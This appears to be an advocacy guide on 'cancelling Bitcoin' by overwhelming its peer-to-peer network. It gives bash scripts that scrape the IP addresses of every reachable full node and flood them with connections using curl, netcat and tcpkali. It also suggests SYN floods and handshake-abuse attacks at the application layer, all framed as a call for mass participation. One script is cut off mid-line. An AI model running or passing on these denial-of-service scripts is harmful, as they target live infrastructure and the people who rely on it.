# Cancelling Bitcoin - Definitive How To guide
## TLDR
Bitcoin wastes immense amounts of energy. It's community is complicit with crime and uses divisive marketing tactics. This poses great risk of backlash from the rest of society, using the methods described below to create long running outages of Bitcoin's network and/or network splits that may cause transactions to be rolled back. Since no one wants to have their assets sieged at will by an angry mob, this situation jeopardizes Bitcoin's price. Many professionals are aware and have been warning about these issues. Hackers would like to keep the following information out of sight because it might kill their ransomware golden goose.

## Overview

Bitcoin does not have access control mechanism, this is touted as a feature, allowing anyone with internet access to participate in various ways. Send & receive transactions or submit & receive information about the other participants in the network. The open nature of the network is in fact it's achilles heel because activists can flood the network with garbage information and consume all of it's availabe resources. Every network and computer system has limited resources such as bandwidth, memory and computing power. In order to estimate the risk, we need to estimate the different capacities in the system and find the ones that are the easiest to overwhelm. Proper modern deployments use the cloud to automatically scale resources according to need, this would make the network much harder to attack while exposing the fallacy behind decentralization claims.

## Estimating networks capacity
The myth that Bitcoin's network has massive capacities relies on technical slight of hand. The network is comprised of three different nodes which contribute and consume different resources to the network.

1. Full Nodes - These are distributed data stores backed by Level DB. They provide services of data query & propagation.
2. Wallet Nodes - These are typically short lived nodes, they do not store the full database of around 360GB at the time of writing. These nodes do not publish "NETWORK_NODE" bit to to inform other participants of their limited capacity. 
3. Miner Nodes - These nodes encompass the majority of resources of the network. Since mining is done in private these are not a target for crowd sourced attack and are irrelevant for the purpose of this article.

It is important to note that adding mining resources to bitcoin is rewarded by design while adding distributed database nodes is not rewarded at all. It should surprise no one that as mining network scaled, the resouces for the distributed database node have been starved of resources. For a reasonable attacker miners and their separate network are irrelevant.

### Full-node resources
Many are aware of block size wars, where Bitcoin's development team chose to limit the resources needed from each full node in order to lower the barriers for entry for full nodes. There are other limitations in the reference full node implemenation. Limiting node's capacity makes each node vulnerable to various denial of services attacks. Some of the [capacities](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/net.h) of Full Nodes are:
1. Networking
   1. [125](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/net.h#L72) simultanous peer connections
   1. [11/125](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/net.h#L64-L68) Are for outgoing connections
   1. [1/125](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/net.h#L68) "Feeler" connection to test availability of new nodes
1. Address Manager
   1. 1024 "[buckets](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/addrman.h#L130)" for storing information about new nodes 
   1. 256 "[buckets](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/addrman.h#L130)" for storing information about nodes that had been reached
   1. 64 entries in each [bucket](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/addrman.h#L133)
   2. Publicly accessible [services](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/addrman.cpp#L288) attribute for each new node

As we shall see, any of these limitations is subject to various attacks.

### How many full-nodes are out there?
We will write our own scraper further on, in the meantime you can look at [bitnodes.io](https://bitcoin.io) or [bitcoinstatus.net](http://bitcoinstatus.net). At the moment of writing, I can reach 5500 nodes that advertise themselves as full nodes using [NODE_NETWORK](https://github.com/bitcoin/bitcoin/blob/b34bf2b42caaee7c8714c1229e877128916d914a/src/protocol.h#L276) bit.
Bitnodes shows me 8500 because it considers nodes active if they are reachable in the recent past, some are just wallet software that only relays information. You can try it yourself. The following command uses [bitnodes api](https://bitnodes.io/api/) to get the latest list of nodes, we parse it using ruby, then count how many have their "services" field on.
```bash
curl -H "Accept: application/json; indent=4" https://bitnodes.io/api/v1/snapshots/latest/ |\
 ruby -e 'require("json"); puts JSON.parse(ARGF.read())["nodes"].values.count{|a| a[3] % 2 == 1}'
 ```
 For later usage, let's save the following file as targets.sh and set +x flag.
```bash
#!/bin/bash

  # get latest nodes
curl -H "Accept: application/json; indent=4" https://bitnodes.io/api/v1/snapshots/latest/ |\
  # pattern for node's keys
  egrep "\[\$" |\
  # remove onion addresses
  grep -v "onion" |\
  # select the inside of quoted string
  cut -d'"' -f 2 |\
  # remove ipv6 notation markers
  tr -d '[]
````
In order to test which ipv4 nodes are availabe an attacker could use the following bash script
```bash
#!/bin/bash
tmpfile=$(mktemp)
count=0
timeout=60
for target in $(./targets.sh); do
  curl -m $timeout --connect-timeout $timeout $target > /dev/null 2>> $tmpfile &
  count=$((count+1))
  sleep 0.005 # ~200 connections per second
done
wait
echo Reached $(grep -c "Empty reply from server" $tmpfile)/$count nodes
rm $tmpfile
````
This scripts counts how many of the nodes are responding to an http requests by closing the connection with an empty reply as the official full node software does. 

#### A trivial attack
At 200 connections per second, the script above would take about 2 minutes to scan the whole range. An attacker of course could use higher rate to tax the network. Since the network has about 7k-8k available nodes, the incoming connection capacity of the network is about 114 * 8,000, roughly 900,000. That means that 900 activists using this trivial script at a pace of 1000 connections per second continously could consume much of the incoming connection capacity of the whole network.
This style of attack is not sophisticated, yet at scale it could be highly effective.

#### One level up
The first script uses curl to make http request, the server recognizes we are not communicating using the correct protocol and closes the connection quickly freeing up resources such as entries in the connection table. In order to make the attack more effective we can keep the connection open without sending anything, this would consume more resources over time while the server is waiting for a "version" message that never arrives. To run this example you need netcat utility. Running `./max_connections.sh 2000` would try to keep 2000 connections open.

```bash
#!/bin/bash
max_connections=$1

while [ $(ps --no-headers -o pid --ppid=$$ | wc -w) -lt "$max_connections" ]; do
  for target in $(./targets.sh); do
    port=$(echo $target | rev | cut -d":" -f1 | rev)
    ip=$(echo $target | rev | cut -d":" -f2-20 | rev)
    echo connecting to $ip $port
    nc $ip $port > /dev/null&

    while [ $(ps --no-headers -o pid --ppid=$$ | wc -w) -gt "$max_connections" ]; do
      sleep 1
    done
  done
done
```

#### More effective tools
Running operating system process for each connection is very inefficient. There are purpose built tools that can generate many connections very efficiently. This example uses [tcpkali](https://github.com/satori-com/tcpkali). Please note this system [configuration](https://github.com/satori-com/tcpkali/blob/master/doc/tcpkali.man.md#see-also) is needed to allow a machine to generate up to 55000 connections per interface. 
```bash
tcpkali --connect-rate 500 --duration=1200 --connections 20000 $(./targets.sh)
```
I have a full node running on my dev environment for testing. It is configured not to communicate with the rest of the Bitcoin's network. When i ran tcp kali connection loading it easily pegged two cores at 100%. It could also be run with one milisecond timeout in order to simulate a SYN flood and fill target's connection tables.

### L7 attacks
While the tools above are enough for activists to create outages. Bitcoin has many vulnerabilities in the application layer too. Since the protocol is not encrypted, any party between two nodes can manipulate communication. This was done in the [past](https://www.eff.org/es/wp/packet-forgery-isps-report-comcast-affair) by ISPs in order to restrict Bittorrent. We can be sure that the DPI technology that was used to do that has advanced since inception 20 years ago. A naive solution to L7 attacks would be to block peers that spam or send garbage. The problem is ISPs, governments or even Tor exit node can perform the flagged behavior causing peers to be blocked. Bitcoin solution is to sweep all these vectors of attack under the rug and focus on hype and marketing.

#### Scraper
Connecting to a node only to ask for a list of peers they know is an integral part of the reference implementation works. When a full node has no new peers to try it uses [dns seeds](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/chainparams.cpp#L121-L129) to find targets to [solicit](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/net.h#L175-L178) addresses from. DNS entries are controlled by a group of unknown people that we can call Bitcoin's IT department.![image](https://user-images.githubusercontent.com/1638049/120117998-cebff680-c155-11eb-89af-d456dc631666.png)They can collude and send some wallets of their choosing to a subnetwork under their complete control but this is besides the point of this paragraph.
Activists can follow the pattern of soliciting addresses but more aggressively. Soliciting is much cheaper computationally than generating the responses so it's a more effective way of attacking the network than simply opening connections.
In order to solicit addresses a client needs to complete a proper handshake. Client connects to a server, must send a version message then wait for a similar version message from server. Then it can send several signaling messages coordinating supported features followed by verack message. Server does the same and connection is considered [SuccsefullyConnected](https://github.com/bitcoin/bitcoin/blob/55a156fca08713b020aafef91f40df8ce4bc3cae/src/net_processing.cpp#L2648). 
Latest version as of writing is 70016. Every message is wrapped in header containing magic number that indicates network (main/test etc), checksum & message size. Since the C++ code can be difficult to read, i use the python test suite for reference about message types. For example, this is how a [version message](https://github.com/bitcoin/bitcoin/blob/b34bf2b42caaee7c8714c1229e877128916d914a/test/functional/test_framework/messages.py#L1018) can be constructed.
